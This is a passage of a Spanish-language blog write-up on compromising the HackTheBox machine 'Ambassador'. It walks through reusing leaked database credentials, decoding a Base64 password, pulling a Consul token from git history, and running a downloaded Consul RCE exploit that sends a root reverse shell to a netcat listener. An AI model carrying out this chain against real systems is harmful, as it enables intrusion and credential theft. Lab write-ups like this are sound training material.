        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="k">*</span> from data_source<span class="p">;</span>

</pre></td></tr></tbody></table></code></div></div>
<p>Veremos algo cómo esto.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>sqlite&gt; SELECT <span class="k">*</span> FROM data_source<span class="p">;</span>
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|<span class="o">{}</span>|2022-09-01 22:43:03|2023-01-20 21:54:47|0|<span class="o">{}</span>|1|uKewFgM4z
sqlite&gt; 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="ganamos-acceso"><span class="mr-2">Ganamos acceso</span><a href="#ganamos-acceso" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Donde el parámetro -h corresponde al host -u  al user -p a la contraseña
Ahora nos podemos conectar a <strong>MySQL</strong> debido a que conocemos el user y su contraseña.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre>❯ mysql <span class="nt">-h10</span>.10.11.183 <span class="nt">-ugrafana</span> <span class="nt">-pdontStandSoCloseToMe63221</span><span class="o">!</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 47
Server version: 8.0.30-0ubuntu0.20.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MySQL <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0,172 sec<span class="o">)</span>

MySQL <span class="o">[(</span>none<span class="o">)]&gt;</span> use whackywidget<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
MySQL <span class="o">[</span>whackywidget]&gt; show tables<span class="p">;</span>
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| <span class="nb">users</span>                  |
+------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0,396 sec<span class="o">)</span>

MySQL <span class="o">[</span>whackywidget]&gt; SELECT <span class="k">*</span> FROM <span class="nb">users</span><span class="p">;</span>
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | <span class="nv">YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class="o">==</span> |
+-----------+------------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0,375 sec<span class="o">)</span>

MySQL <span class="o">[</span>whackywidget]&gt; 

</pre></td></tr></tbody></table></code></div></div>

<p>Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span><span class="nb">echo 
</span>anEnglishManInNewYork027468
</pre></td></tr></tbody></table></code></div></div>

<p>Con esas credenciales podemos conectarnos por <strong>SSH</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>❯ ssh developer@10.10.11.183
The authenticity of host <span class="s1">'10.10.11.183 (10.10.11.183)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.183<span class="s1">' (ECDSA) to the list of known hosts.
developer@10.10.11.183'</span>s password: anEnglishManInNewYork027468 
Welcome to Ubuntu 20.04.5 LTS <span class="o">(</span>GNU/Linux 5.4.0-126-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sat 21 Jan 2023 05:10:23 AM UTC

  System load:  0.0               Processes:             229
  Usage of /:   84.4% of 5.07GB   Users logged <span class="k">in</span>:       0
  Memory usage: 49%               IPv4 address <span class="k">for </span>eth0: 10.10.11.183
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan 21 00:27:29 2023 from 10.10.14.105
developer@ambassador:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
developer@ambassador:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Podemos leer la primara flag.</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>developer@ambassador:~$ cat user.txt 
565**************************1b5
developer@ambassador:~$ 
</pre></td></tr></tbody></table></code></div></div>
<h2 id="enumeración-del-sistema"><span class="mr-2">Enumeración del sistema</span><a href="#enumeración-del-sistema" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">.</span>  ..  .bash_history  .bash_logout  .bashrc  .cache
.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txt
developer@ambassador:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Si lo leemos nos dice la ruta donde se encuentra.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span><span class="nb">cat</span> .gitconfig 
<span class="o">[</span>user]
    name <span class="o">=</span> Developer
    email <span class="o">=</span> developer@ambassador.local
<span class="o">[</span>safe]
    directory <span class="o">=</span> /opt/my-app
developer@ambassador:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Si nos situamos en la carpeta <code class="language-plaintext highlighter-rouge">/opt</code> podemos ver el proyecto github.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>developer@ambassador:/opt/my-app<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="nb">.</span>  ..  .git  .gitignore  <span class="nb">env  </span>whackywidget
developer@ambassador:/opt/my-app<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Si hacemos un <code class="language-plaintext highlighter-rouge">git -log</code> podemos ver los últimos commits que se aplicaron</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>developer@ambassador:/opt/my-app<span class="nv">$ </span>git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c <span class="o">(</span>HEAD -&gt; main<span class="o">)</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app<span class="nv">$ </span>

</pre></td></tr></tbody></table></code></div></div>
<p>Ahora haciendo un <code class="language-plaintext highlighter-rouge">git show</code> se nos mostrará información acerca de ese commit.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>
developer@ambassador:/opt/my-app$ git show
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:/opt/my-app$ 
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.</p>

<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Usando el exploit de <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API">GatoGamer</a> podemos elevar nuestros privilegios, nos descargamos el repositorio de <strong>GitHub
**
, nos montamos un servidor **HTTP</strong> con <strong>Python</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python <span class="nt">-m</span> http.server 80
</pre></td></tr></tbody></table></code></div></div>

<p>En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>developer@ambassador:~<span class="nv">$ </span>wget http://10.10.14.61/exploit.py
<span class="nt">--2023-01-21</span> 05:40:22--  http://10.10.14.61/exploit.py
Connecting to 10.10.14.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1409 <span class="o">(</span>1.4K<span class="o">)</span> <span class="o">[</span>text/x-python]
Saving to: ‘exploit.py.1’

exploit.py.1                                  100%[<span class="o">=================================================================================================&gt;]</span>   1.38K  <span class="nt">--</span>.-KB/s    <span class="k">in 
</span>0s      

2023-01-21 05:40:22 <span class="o">(</span>95.1 MB/s<span class="o">)</span> - ‘exploit.py.1’ saved <span class="o">[</span>1409/1409]

developer@ambassador:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>En la máquina víctima ejecutamos lo siguiente.
Nota: Recuerda cambiar tu IP de HTB
En nuestra máquina host nos ponemos en escucha</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>developer@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-nlvp</span> 123
listening on <span class="o">[</span>any] 123 ...
</pre></td></tr></tbody></table></code></div></div>
<p>Al ejecutarlo nos debe llegar la shell como root</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>❯ nc <span class="nt">-nlvp</span> 123
listening on <span class="o">[</span>any] 123 ...
connect to <span class="o">[</span>10.10.14.61] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.183] 58732
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3731<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@ambassador:/# 
</pre></td></tr></tbody></table></code></div></div>

<p>Ahora podemos vizualizar la flag como root</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>root@ambassador:~# <span class="nb">ls
</span>cleanup.sh  root.txt  snap
root@ambassador:~# <span class="nb">cat </span>root.txt 
5a4<span class="k">**************************</span>4b1
root@ambassador:~# 
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a>
      
      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >writeup</a>
      
      <a href="/tags/grafana/"
          class="post-tag no-text-decoration" >grafana</a>
      
      <a href="/tags/directoty-transversal/"
          class="post-tag no-text-decoration" >directoty transversal</a>
      
      <a href="/tags/arbitrary-file-read/"
          class="post-tag no-text-decoration" >arbitrary file read</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >medium</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Ambassador+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fambassador-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Ambassador+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fambassador-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fambassador-writeup%2F&text=Ambassador+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/precious-writeup/">Precious WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/ambassador-writeup/">Ambassador WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    
      
      <a class="post-tag" href="/tags/directoty-transversal/">directoty transversal</a>
    
      
      <a class="post-tag" href="/tags/docker/">docker</a>
    
      
      <a class="post-tag" href="/tags/grafana/">grafana</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/no-sql/">no sql</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/shoppy-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    >
  2023-01-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/precious-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673884800"
    data-df="YYYY-MM-DD"
    >
  2023-01-16
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Precious WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré comó comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la es...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/photobomb-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1675440000"
    data-df="YYYY-MM-DD"
    >
  2023-02-03
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking

Escaneo NMAP

Antes de empezar les recomie...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/shoppy-writeup/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>Shoppy WriteUp</p>
  </a>
  

  
  <a href="/posts/precious-writeup/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>Precious WriteUp</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    
      
      <a class="post-tag" href="/tags/directoty-transversal/">directoty transversal</a>
    
      
      <a class="post-tag" href="/tags/docker/">docker</a>
    
      
      <a class="post-tag" href="/tags/grafana/">grafana</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
